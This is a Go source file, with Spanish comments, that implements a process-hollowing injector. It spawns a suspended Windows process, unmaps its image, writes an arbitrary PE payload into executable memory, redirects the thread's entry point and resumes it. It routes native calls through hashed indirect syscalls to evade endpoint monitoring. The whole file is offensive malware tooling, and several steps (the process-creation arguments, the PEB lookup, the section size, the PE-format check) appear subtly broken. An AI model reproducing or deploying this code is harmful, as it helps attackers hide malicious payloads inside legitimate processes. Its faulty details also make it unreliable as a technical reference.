package injection

import (
	"encoding/binary"
	"errors"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

type HollowingInjector struct {
	acheron *acheron.Acheron
}

func (h *HollowingInjector) Inject(targetProc string, payload []byte) error {
	// 1. Crear proceso suspendido
	si := &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}

	cmd, err := windows.UTF16PtrFromString(targetProc)
	if err != nil {
		return err
	}

	createProcHash := h.acheron.HashString("NtCreateProcessEx")
	ret, err := h.acheron.Syscall(
		createProcHash,
		uintptr(0),                        // ProcessHandle
		uintptr(unsafe.Pointer(cmd)),      // ImagePathName
		uintptr(0),                        // ObjectAttributes
		uintptr(windows.CurrentProcess()), // ParentProcess
		uintptr(1),                        // InheritObjectTable
		uintptr(0),                        // SectionHandle
		uintptr(0),                        // DebugPort
		uintptr(0),                        // ExceptionPort
		uintptr(windows.CREATE_SUSPENDED), // CreationFlags
		uintptr(unsafe.Pointer(si)),       // StartupInfo
		uintptr(unsafe.Pointer(pi)),       // ProcessInformation
	)

	if ret != 0 || err != nil {
		return errors.New("failed to create process: " + err.Error())
	}

	// 2. Obtener contexto del hilo
	ctx, err := h.getThreadContext(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	// 3. Leer PEB remoto
	pebAddr, err := h.readRemotePEB(pi.Process, ctx)
	if err != nil {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
		return err
	}

	// 4. Desmapear secciones originales
	if err := h.unmapSections(pi.Process, pebAddr); err != nil {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
		return err
	}

	// 5. Mapear nuevo ejecutable
	newBase, err := h.mapPayload(pi.Process, payload, pebAddr)
	if err != nil {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
		return err
	}

	// 6. Parchear EntryPoint
	if err := h.patchEntryPoint(pi.Thread, ctx, newBase, payload); err != nil {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
		return err
	}

	// 7. Reanudar hilo
	resumeHash := h.acheron.HashString("NtResumeThread")
	_, err = h.acheron.Syscall(
		resumeHash,
		uintptr(pi.Thread),
		uintptr(0),
	)

	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	return err
}

// ========== Helper Functions ==========

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [2600]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

const (
	CONTEXT_ALL            = 0x10001F
	SECTION_ALL_ACCESS     = 0xF001F
	SEC_COMMIT             = 0x8000000
	PAGE_EXECUTE_READWRITE = 0x40
)

func (h *HollowingInjector) getThreadContext(thread windows.Handle) (*CONTEXT, error) {
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_ALL

	getCtxHash := h.acheron.HashString("NtGetContextThread")
	ret, err := h.acheron.Syscall(
		getCtxHash,
		uintptr(thread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if ret != 0 || err != nil {
		return nil, errors.New("failed to get thread context: " + err.Error())
	}

	return &ctx, nil
}

func (h *HollowingInjector) readRemotePEB(process windows.Handle, ctx *CONTEXT) (uintptr, error) {
	// En arquitectura x64, el PEB está en GS:[0x60]
	var pebAddr uintptr
	readMemHash := h.acheron.HashString("NtReadVirtualMemory")

	// Leer dirección base desde el TEB
	_, err := h.acheron.Syscall(
		readMemHash,
		uintptr(process),
		uintptr(ctx.Rdx+0x60), // GS register -> Rdx en CONTEXT
		uintptr(unsafe.Pointer(&pebAddr)),
		unsafe.Sizeof(pebAddr),
		uintptr(0),
	)

	if err != nil {
		return 0, err
	}

	return pebAddr, nil
}

func (h *HollowingInjector) unmapSections(process windows.Handle, pebAddr uintptr) error {
	var imageBase uintptr
	readMemHash := h.acheron.HashString("NtReadVirtualMemory")

	// Leer ImageBaseAddress desde PEB
	_, err := h.acheron.Syscall(
		readMemHash,
		uintptr(process),
		pebAddr+0x10, // Offset de ImageBaseAddress en PEB
		uintptr(unsafe.Pointer(&imageBase)),
		unsafe.Sizeof(imageBase),
		uintptr(0),
	)
	if err != nil {
		return err
	}

	// Desmapear sección
	unmapHash := h.acheron.HashString("NtUnmapViewOfSection")
	_, err = h.acheron.Syscall(
		unmapHash,
		uintptr(process),
		imageBase,
	)

	return err
}

func (h *HollowingInjector) mapPayload(process windows.Handle, payload []byte, pebAddr uintptr) (uintptr, error) {
	// Parsear encabezado PE
	peHeaderOffset := binary.LittleEndian.Uint32(payload[0x3C:0x40])
	optionalHeader := payload[peHeaderOffset+0x18:]

	// Obtener ImageBase desde OptionalHeader
	if binary.LittleEndian.Uint16(payload[peHeaderOffset:peHeaderOffset+2]) == 0x20B { // PE32+
		_ = binary.LittleEndian.Uint64(optionalHeader[0x18:0x20])
	} else { // PE32
		_ = binary.LittleEndian.Uint32(optionalHeader[0x18:0x1C])
	}

	// Crear nueva sección
	var sectionHandle windows.Handle
	createSecHash := h.acheron.HashString("NtCreateSection")
	_, err := h.acheron.Syscall(
		createSecHash,
		uintptr(unsafe.Pointer(&sectionHandle)),
		SECTION_ALL_ACCESS,
		0,
		uintptr(0),
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		uintptr(0),
	)
	if err != nil {
		return 0, err
	}

	// Mapear sección en proceso remoto
	var remoteBase uintptr
	mapViewHash := h.acheron.HashString("NtMapViewOfSection")
	_, err = h.acheron.Syscall(
		mapViewHash,
		uintptr(sectionHandle),
		uintptr(process),
		uintptr(unsafe.Pointer(&remoteBase)),
		0,
		0,
		uintptr(0),
		uintptr(0),
		PAGE_EXECUTE_READWRITE,
		0,
		0,
	)
	if err != nil {
		return 0, err
	}

	// Escribir payload
	writeMemHash := h.acheron.HashString("NtWriteVirtualMemory")
	_, err = h.acheron.Syscall(
		writeMemHash,
		uintptr(process),
		remoteBase,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(0),
	)
	if err != nil {
		return 0, err
	}

	// Actualizar PEB
	var newBase uint64
	if binary.LittleEndian.Uint16(payload[peHeaderOffset:peHeaderOffset+2]) == 0x20B {
		newBase = uint64(remoteBase)
	} else {
		newBase = uint64(uint32(remoteBase))
	}

	_, err = h.acheron.Syscall(
		writeMemHash,
		uintptr(process),
		pebAddr+0x10, // ImageBaseAddress en PEB
		uintptr(unsafe.Pointer(&newBase)),
		unsafe.Sizeof(newBase),
		uintptr(0),
	)

	return remoteBase, err
}

func (h *HollowingInjector) patchEntryPoint(thread windows.Handle, ctx *CONTEXT, newBase uintptr, payload []byte) error {
	// Obtener EntryPoint desde headers PE
	peHeaderOffset := binary.LittleEndian.Uint32(payload[0x3C:0x40])
	optionalHeader := payload[peHeaderOffset+0x18:]
	entryPointRVA := binary.LittleEndian.Uint32(optionalHeader[0x10:0x14]) // AddressOfEntryPoint

	// Actualizar contexto
	ctx.Rip = uint64(newBase) + uint64(entryPointRVA)

	// Escribir contexto modificado
	setCtxHash := h.acheron.HashString("NtSetContextThread")
	_, err := h.acheron.Syscall(
		setCtxHash,
		uintptr(thread),
		uintptr(unsafe.Pointer(ctx)),
	)

	return err
}
